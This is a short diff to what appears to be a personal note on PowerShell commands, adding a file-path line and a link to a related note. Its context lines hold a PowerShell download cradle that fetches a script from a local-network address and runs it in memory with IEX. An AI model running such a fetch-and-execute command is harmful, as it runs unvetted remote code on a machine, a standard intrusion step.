@@ -4,6 +4,8 @@ powershell -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.69.6
 IEX(New-Object Net.WebClient).downloadString('http://192.168.69.69/script.ps1')
 ```
 
+` zet/20221003151100/README.md `
+
 # Related
 
 - [20221003151101](/zet/20221003151101/README.md) powershell commands
